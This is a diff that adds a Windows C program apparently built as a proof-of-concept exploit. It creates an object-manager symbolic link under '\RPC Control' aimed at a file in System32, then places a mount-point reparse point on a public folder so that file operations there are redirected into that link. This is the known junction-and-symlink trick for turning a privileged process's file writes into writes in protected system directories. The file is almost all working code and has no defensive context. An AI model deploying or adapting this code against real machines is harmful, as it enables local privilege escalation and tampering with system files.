@@ -1,0 +1,160 @@
+#include <stdio.h>
+#include <windows.h>
+#include <Psapi.h>
+#include <profileapi.h>
+#include <Strsafe.h>
+#pragma warning (disable: 4996)
+#define OBJ_CASE_INSENSITIVE   0x00000040
+#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)
+#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)
+#define REPARSE_GUID_DATA_BUFFER_HEADER_SIZE   UFIELD_OFFSET(REPARSE_GUID_DATA_BUFFER, GenericReparseBuffer)
+
+typedef struct _LSA_UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+	ULONG           Length;
+	HANDLE          RootDirectory;
+	PUNICODE_STRING ObjectName;
+	ULONG           Attributes;
+	PVOID           SecurityDescriptor;
+	PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+typedef struct _REPARSE_DATA_BUFFER {
+	ULONG  ReparseTag;
+	USHORT ReparseDataLength;
+	USHORT Reserved;
+	union {
+		struct {
+			USHORT SubstituteNameOffset;
+			USHORT SubstituteNameLength;
+			USHORT PrintNameOffset;
+			USHORT PrintNameLength;
+			ULONG Flags;
+			WCHAR PathBuffer[1];
+		} SymbolicLinkReparseBuffer;
+		struct {
+			USHORT SubstituteNameOffset;
+			USHORT SubstituteNameLength;
+			USHORT PrintNameOffset;
+			USHORT PrintNameLength;
+			WCHAR PathBuffer[1];
+		} MountPointReparseBuffer;
+		struct {
+			UCHAR  DataBuffer[1];
+		} GenericReparseBuffer;
+	} DUMMYUNIONNAME;
+} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
+
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+
+typedef VOID(WINAPI* RtlInitUnicodeString_t)(IN OUT PUNICODE_STRING DestinationString,
+	IN PCWSTR              SourceString OPTIONAL);
+#define InitializeObjectAttributes(i, o, a, r, s) {  \
+                (i)->Length = sizeof(OBJECT_ATTRIBUTES); \
+                (i)->RootDirectory = r;                  \
+                (i)->Attributes = a;                     \
+                (i)->ObjectName = o;                     \
+                (i)->SecurityDescriptor = s;             \
+                (i)->SecurityQualityOfService = NULL;    \
+            }
+RtlInitUnicodeString_t        RtlInitUnicodeString;
+
+typedef NTSTATUS(WINAPI* NtCreateSymbolicLinkObject_t)(OUT PHANDLE           SymbolicLinkHandle,
+	IN ACCESS_MASK        DesiredAccess,
+	IN POBJECT_ATTRIBUTES ObjectAttributes,
+	IN PUNICODE_STRING    TargetName);
+
+NtCreateSymbolicLinkObject_t  NtCreateSymbolicLinkObject;
+
+void  CreateSymlink(HANDLE hRoot, LPCWSTR SymbolicLinkName, LPCWSTR TargetName) {
+	HANDLE SymbolicLinkHandle = NULL;
+	UNICODE_STRING TargetObjectName = { 0 };
+	OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
+	UNICODE_STRING SymbolicLinkObjectName = { 0 };
+
+	LPCSTR nt = "ntdll";
+	HMODULE hntdll = GetModuleHandleA(nt);
+	RtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(hntdll, "RtlInitUnicodeString");
+	NtCreateSymbolicLinkObject = (NtCreateSymbolicLinkObject_t)GetProcAddress(hntdll, "NtCreateSymbolicLinkObject");
+
+	RtlInitUnicodeString(&SymbolicLinkObjectName, SymbolicLinkName);
+	RtlInitUnicodeString(&TargetObjectName, TargetName);
+
+	InitializeObjectAttributes(&ObjectAttributes,
+		&SymbolicLinkObjectName,
+		OBJ_CASE_INSENSITIVE,
+		hRoot,
+		NULL);
+
+	int NtStatus = NtCreateSymbolicLinkObject(&SymbolicLinkHandle,
+		SYMBOLIC_LINK_ALL_ACCESS,
+		&ObjectAttributes,
+		&TargetObjectName);
+
+	if (NtStatus != 0) {
+		printf("\t\t[-] Failed to open object directory: 0x%X\n", NtStatus);
+		exit(-1);
+	}
+
+}
+
+
+int main() {
+
+	//设置符号链接
+	CreateSymlink(0, L"\\RPC Control\\1234", L"\\??\\C:\\Windows\\System32\\12345");
+
+	//设置挂载点
+	HANDLE h = CreateFileA("C:\\Users\\Public\\Recorded\\TempRec",
+		GENERIC_READ | (1 ? GENERIC_WRITE : 0),
+		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+		0,
+		OPEN_EXISTING,
+		FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
+		0);
+
+	DWORD dw;
+
+	const size_t target_byte_size = 0x18;
+	const size_t printname_byte_size = 0;
+	const size_t path_buffer_size = 0x24;
+
+	REPARSE_DATA_BUFFER* buffer = (REPARSE_DATA_BUFFER*)malloc(0x2c);
+	buffer->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
+	buffer->ReparseDataLength = 0x24;
+	buffer->Reserved = 0;
+
+	buffer->MountPointReparseBuffer.SubstituteNameOffset = 0;
+	buffer->MountPointReparseBuffer.SubstituteNameLength = 0x18;
+	buffer->MountPointReparseBuffer.PrintNameOffset = 0x1a;
+	buffer->MountPointReparseBuffer.PrintNameLength = 0;
+
+	memcpy(buffer->MountPointReparseBuffer.PathBuffer, L"\\RPC Control", target_byte_size + 2);
+
+	memcpy(buffer->MountPointReparseBuffer.PathBuffer + 0xc + 1, L"", printname_byte_size + 2);
+
+	DeviceIoControl(h, FSCTL_SET_REPARSE_POINT, buffer, 0x2c, 0, 0, &dw, 0);
+	CloseHandle(h);
+
+	h = CreateFileA("C:\\Users\\Public\\Recorded\\TempRec",
+		GENERIC_READ | (1 ? GENERIC_WRITE : 0),
+		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+		0,
+		OPEN_EXISTING,
+		FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
+		0);
+
+    //取消挂载点
+    //REPARSE_GUID_DATA_BUFFER reparse_buffer = { 0 };
+    //reparse_buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
+    //DeviceIoControl(h, FSCTL_DELETE_REPARSE_POINT, &reparse_buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE,0, 0, &dw, 0);
+    //CloseHandle(h);
+
+	return 0;
+}
+
